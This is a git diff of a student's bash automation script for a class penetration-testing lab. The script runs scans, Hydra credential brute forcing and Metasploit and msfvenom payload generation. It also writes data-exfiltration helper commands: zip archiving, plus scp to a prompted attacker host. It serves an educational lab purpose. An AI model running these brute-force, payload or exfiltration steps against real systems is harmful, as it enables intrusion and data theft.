@@ -1,41 +1,94 @@
 #!/usr/bin/env bash
 
-# =========================================================
-# Project Breach Point - Automation Script
-# =========================================================
-# This script implements an end-to-end lab workflow for the
-# Breach Point assignment. It assumes you are operating in a
-# legal, authorized test environment such as your class lab
-# or dedicated test network.
-#
-# High-level workflow:
-#   - Stage 1: Collect user input (target, output dir, basic/full).
-#   - Stage 2: Run TCP/UDP scans (basic) and, if chosen, full NSE
-#              vulnerability scans with Searchsploit correlation.
-#   - Stage 3: Perform weak-credential checks (Hydra, NSE brute scripts).
-#   - Stage 4: Generate Metasploit resource (.rc) files.
-#   - Stage 5: Generate payloads (msfvenom or suggested commands).
-#   - Stage 6: Generate helper commands for data exfiltration (Linux/Windows).
-#   - Stage 7: Search results and summarize session + dependencies.
-#
-# Basic vs Full scans:
-#   - basic: TCP/UDP scans, service/version detection, optional quick weak
-#            password NSE scan (ssh/ftp/smb/rdp).
-#   - full : everything in basic, plus vuln NSE scripts and Searchsploit
-#            mapping of results for potential exploitation paths.
-#
-# Prerequisites / Notes:
-#   - Tested on Debian/Ubuntu-style systems with apt-get available.
-#   - Uses: nmap, hydra, Metasploit (msfconsole/msfvenom), searchsploit,
-#           zip, scp, base64, pscp (for Windows transfers).
-#   - The script can attempt to auto-install missing tools via apt-get,
-#     but users can decline. Some features will then be degraded/mocked.
-#   - Certain scan options (-sS, -O, some NSE scripts) may require root
-#     privileges to work reliably.
-#
-# If you adapt code snippets from external sources (blogs, GitHub, etc.),
-# document your references in your project report and/or inline comments.
-# =========================================================
+# === Script Authored by ===
+# Student Name:	Tan Amos
+# Institute:	Centre for Cybersecurity
+# Class Code: 	CCK3_250714
+# Student Code: s22
+# Trainer:      Samson
+
+# Show a help/overview message and exit when called with -h or --help.
+print_usage() {
+    cat <<EOF
+Usage: sudo $(basename "$0")
+
+=========================================================
+Project Breach Point - Automation Script
+=========================================================
+by Tan Amos, Dec 2025
+
+This script automates an end-to-end lab workflow for the "Breach Point"
+assignment in a legal, authorized test environment (e.g., your class lab
+or a dedicated test network).
+
+High-level workflow:
+  - Stage 1: Collect user input (target network, output directory, basic/full mode).
+  - Stage 2: Run TCP/UDP scans and, in full mode, NSE vulnerability scans
+             with optional Searchsploit correlation.
+  - Stage 3: Perform weak-credential checks with Hydra (or generate suggested
+             commands if Hydra is missing).
+  - Stage 4: Generate Metasploit resource (.rc) files (SSH sweep, handler,
+             local exploit suggester).
+  - Stage 5: Generate payloads with msfvenom (or suggested commands if
+             msfvenom is missing).
+  - Stage 6: Generate helper commands for data exfiltration (Linux/Windows);
+             the script writes example commands but does not execute exfiltration.
+  - Stage 7: Search within results and summarize session actions and
+             dependency status.
+
+Scan modes:
+  - basic: TCP and UDP scanning, service/version detection, optional quick
+           weak-password NSE scan (ssh/ftp/smb/rdp).
+  - full : Everything in "basic", plus nmap vuln NSE scripts and optional
+           Searchsploit mapping of scan results.
+
+Outputs (per run):
+  - Timestamped run directory under the chosen output directory:
+      \$OUTDIR/run_YYYYMMDD_HHMMSS/
+        scans/         # nmap/masscan outputs (text + XML where applicable)
+        credentials/   # Hydra results or suggested commands
+        metasploit/    # Generated Metasploit .rc files
+        payloads/      # Generated payload files or payload hints
+        logs/          # Session log and data_exfil_commands.txt
+
+  - Main session log:
+      \$RUN_DIR/logs/session.log
+
+Tools used (if available):
+  - nmap            : network scanning, NSE checks, weak-password discovery
+  - masscan         : fast UDP discovery to feed targeted nmap scans
+  - hydra           : weak credential brute forcing
+  - msfconsole      : Metasploit RC execution and exploitation
+  - msfvenom        : payload generation
+  - searchsploit    : vulnerability mapping from scan output
+  - zip, scp, base64: Linux exfiltration helper commands
+  - pscp            : Windows exfiltration helper commands
+
+Notes:
+  - The script can attempt to auto-install missing tools via apt-get, but you
+    can decline. Features using those tools will then be limited or replaced
+    with suggested commands instead of real execution.
+
+Exit codes:
+  - 0 : normal completion
+  - 1 : unrecoverable filesystem error (e.g., cannot create output directory)
+  - 2 : must run as root (script was invoked without sudo/root)
+
+Options:
+  -h, --help   Show this help message and exit.
+
+EOF
+}
+
+# Show help early and exit cleanly if -h/--help is passed.
+if [[ $# -gt 0 ]]; then
+  case "$1" in
+    -h|--help)
+      print_usage
+      exit 0
+      ;;
+  esac
+fi
 
 set -o nounset
 set -o pipefail
@@ -43,13 +96,39 @@ set -o pipefail
 # Require root / sudo
 if [[ "$EUID" -ne 0 ]]; then
     echo "[!] This script must be run as root (sudo)."
-	echo "    Example: sudo $(basename "$0")"
-    exit 1
+    echo
+    echo "    Example:"
+    echo "        sudo $(basename "$0")"
+    echo
+    exit 2
 fi
 
-########################
-# 0. Helper functions  #
-########################
+# Show a simple startup header and offer quick access to the overview.
+echo "========================================================="
+echo "Project Breach Point - Automation Script"
+echo "========================================================="
+echo "by Tan Amos, Dec 2025"
+echo
+
+if [[ -t 0 ]]; then
+    # Let the user press h/H for help, or Enter to continue into Stage 1.
+    read -rp "Press [h/H] for help/overview, or press Enter to continue: " START_CHOICE
+    case "$START_CHOICE" in
+        h|H)
+            print_usage
+            echo
+            read -rp "Press Enter to proceed to user input..." _
+            ;;
+        *)
+            # Any other input (including empty) just continues.
+            ;;
+    esac
+    echo
+fi
+
+############
+# GLOBALS  #
+############
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 DEFAULT_WORDLIST="$SCRIPT_DIR/wordlists/password.lst"
@@ -57,20 +136,24 @@ SESSION_ACTIONS=()
 APT_UPDATED=0
 SESSION_FINALIZED=0
 SESSION_LOG="/tmp/breach_point.log"
+
+# Default packets-per-second rate for masscan. The first time we run a UDP
+# discovery we’ll prompt (if interactive) and then cache the choice in
+# MASSCAN_RATE so subsequent scans reuse it without re-prompting.
 MASSCAN_RATE_DEFAULT=1000
 
 # Core tools leveraged across the workflow; used for startup checks and on-demand rechecks.
 CORE_TOOLS=(nmap masscan hydra msfconsole msfvenom searchsploit zip scp base64 pscp)
 declare -A TOOL_INSTALL_DECISIONS=()
 
+########################
+# 0. Helper functions  #
+########################
+
 banner() {
     echo "========================================================="
     echo "[*] $1"
     echo "========================================================="
-}
-
-pause() {
-    read -rp "Press Enter to continue..."
 }
 
 log_msg() {
@@ -380,16 +463,19 @@ done
 read -rp "Enter name for output directory [default: output]: " OUTDIR
 OUTDIR="${OUTDIR:-output}"
 ensure_dir "$OUTDIR"
-log_msg "Using output directory: $OUTDIR"
 
 # Create a timestamped run folder inside OUTDIR
 RUN_ID="$(date '+run_%Y%m%d_%H%M%S')"
 RUN_DIR="$OUTDIR/$RUN_ID"
 ensure_dir "$RUN_DIR" && ensure_dir "$RUN_DIR/scans" && ensure_dir "$RUN_DIR/credentials" \
     && ensure_dir "$RUN_DIR/metasploit" && ensure_dir "$RUN_DIR/payloads" && ensure_dir "$RUN_DIR/logs"
+
+# Point logging at the run-specific log file *before* we call log_msg
 SESSION_LOG="$RUN_DIR/logs/session.log"
 echo "Session log will be written to: $SESSION_LOG"
 
+# Now all logs go into this run's log file
+log_msg "Using output directory: $OUTDIR"
 log_msg "New session started. Target: $TARGET_NET, Output dir: $RUN_DIR"
 
 # Basic or Full
@@ -444,21 +530,24 @@ run_scans() {
     banner "UDP discovery with masscan (then targeted nmap -sU)"
 
     if require_tool masscan; then
-        # Prompt for rate on first use if not already set; in non-interactive mode,
-        # fall back silently to the default to avoid blocking.
-        if [[ -z "${MASSCAN_RATE:-}" ]]; then
-            if [[ -t 0 ]]; then
-                read -rp "Masscan rate in packets/second [default: $MASSCAN_RATE_DEFAULT]: " MASSCAN_RATE
-                MASSCAN_RATE="${MASSCAN_RATE:-$MASSCAN_RATE_DEFAULT}"
-            else
-                MASSCAN_RATE="$MASSCAN_RATE_DEFAULT"
-            fi
+        # Prompt for rate once, then cache in MASSCAN_RATE for the rest of the session.
+        local masscan_rate="${MASSCAN_RATE:-$MASSCAN_RATE_DEFAULT}"
 
-            if [[ ! "$MASSCAN_RATE" =~ ^[0-9]+$ ]]; then
-                echo "Masscan rate must be numeric; falling back to $MASSCAN_RATE_DEFAULT." | tee -a "$SESSION_LOG"
-                MASSCAN_RATE="$MASSCAN_RATE_DEFAULT"
-            fi
+        if [[ -t 0 && -z "${MASSCAN_RATE:-}" ]]; then
+            read -rp "Masscan rate in packets/second [default: $MASSCAN_RATE_DEFAULT]: " masscan_rate
+            masscan_rate="${masscan_rate:-$MASSCAN_RATE_DEFAULT}"
+        elif [[ -z "${MASSCAN_RATE:-}" ]]; then
+            # Non-interactive: first run, no prior value – use default.
+            masscan_rate="$MASSCAN_RATE_DEFAULT"
         fi
+
+        if [[ ! "$masscan_rate" =~ ^[0-9]+$ ]]; then
+            echo "Masscan rate must be numeric; falling back to $MASSCAN_RATE_DEFAULT." | tee -a "$SESSION_LOG"
+            masscan_rate="$MASSCAN_RATE_DEFAULT"
+        fi
+
+        # Cache the (validated) choice globally so repeated scans don't re-prompt.
+        MASSCAN_RATE="$masscan_rate"
 
         local masscan_out="$RUN_DIR/scans/masscan_udp.lst"
 
@@ -466,7 +555,7 @@ run_scans() {
         # nature of UDP and firewalls dropping packets, some open UDP services may
         # not respond at all. We treat whatever masscan finds as a fast shortlist to
         # feed into a more detailed nmap -sU scan.
-        masscan -pU:1-65535 "$TARGET_NET" --rate "$MASSCAN_RATE" -oL "$masscan_out" 2>&1 | tee -a "$SESSION_LOG"
+        masscan -pU:1-65535 "$TARGET_NET" --rate "$masscan_rate" -oL "$masscan_out" 2>&1 | tee -a "$SESSION_LOG"
         record_action "Masscan UDP discovery saved to $masscan_out"
 
         # Extract unique UDP ports and hosts from masscan's list (-oL format):
@@ -680,9 +769,9 @@ weak_credentials() {
 }
 
 
-###############################################
-# 4. Metasploit .rc File Generation (Skeleton)#
-###############################################
+#####################################
+# 4. Metasploit .rc File Generation #
+#####################################
 
 generate_msf_rc() {
     banner "Stage 4 - Metasploit Resource File"
@@ -775,9 +864,9 @@ EOF
 }
 
 
-###################################
-# 5. Payload Generation Skeleton  #
-###################################
+#########################
+# 5. Payload Generation #
+#########################
 
 generate_payload() {
     banner "Stage 5 - Payload Generation"
@@ -857,7 +946,7 @@ data_exfil_helper() {
         TARGET_ROOT="${TARGET_ROOT:-C:\\}"
     fi
 
-    read -rp "Path(s) to compress (you can use globs like /home/user/*.docx; default: results from search): " COMPRESS_PATHS
+    read -rp "Path(s) to compress (space-separated; globs like /home/user/*.docx allowed; default: results from search): " COMPRESS_PATHS
     read -rp "Attacker SCP destination (e.g. user@10.10.10.1:/tmp) [optional]: " SCP_DEST
 
     EXFIL_FILE="$RUN_DIR/logs/data_exfil_commands.txt"
@@ -879,10 +968,11 @@ EOF
         cat >> "$EXFIL_FILE" <<'EOF'
 
 # Compress to zip
+# Note: you can pass one or more paths/globs, space-separated.
 EOF
         if [[ -n "$COMPRESS_PATHS" ]]; then
-            # Wrap paths in quotes to reduce issues with spaces
-            echo "zip -r /tmp/exfil.zip \"$COMPRESS_PATHS\"" >> "$EXFIL_FILE"
+            # Let multiple paths/globs work naturally; quote them yourself if they contain spaces.
+            echo "zip -r /tmp/exfil.zip $COMPRESS_PATHS" >> "$EXFIL_FILE"
         else
             echo "zip -r /tmp/exfil.zip <FILES_OR_DIRS_HERE>" >> "$EXFIL_FILE"
         fi
@@ -913,12 +1003,12 @@ EOF
         cat >> "$EXFIL_FILE" <<'EOF'
 
 REM Compress using PowerShell Compress-Archive
+REM -Path accepts one or more paths/globs, separated by commas or spaces.
 EOF
         if [[ -n "$COMPRESS_PATHS" ]]; then
-            # Wrap paths in quotes so they still work when containing spaces
-            echo "PowerShell Compress-Archive -Path \"$COMPRESS_PATHS\" -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
+            echo "PowerShell Compress-Archive -Path $COMPRESS_PATHS -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
         else
-            echo "PowerShell Compress-Archive -Path <files> -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
+            echo "PowerShell Compress-Archive -Path <files_or_globs> -DestinationPath C:\\exfil.zip" >> "$EXFIL_FILE"
         fi
         cat >> "$EXFIL_FILE" <<'EOF'
 
@@ -966,6 +1056,7 @@ show_menu() {
         echo "5) Data exfiltration helpers"
         echo "6) Search within results"
         echo "7) Check/install dependencies"
+        echo "h) Help / overview"
         echo "0) Exit"
         echo "============================================="
         read -rp "Enter choice: " CHOICE
@@ -978,6 +1069,11 @@ show_menu() {
             5) data_exfil_helper ;;
             6) search_results ;;
             7) dependency_status_menu ;;
+            h|H)
+                print_usage
+                echo
+                read -rp "Press Enter to return to the menu..." _
+                ;;
             0) break ;;
             *) echo "Invalid choice." ;;
         esac
@@ -986,6 +1082,7 @@ show_menu() {
 
 search_results() {
     banner "Stage 7 - Search Inside Results"
+	local TERM
     read -rp "Enter search term: " TERM
     if [[ -z "$TERM" ]]; then
         echo "Search term cannot be empty." | tee -a "$SESSION_LOG"
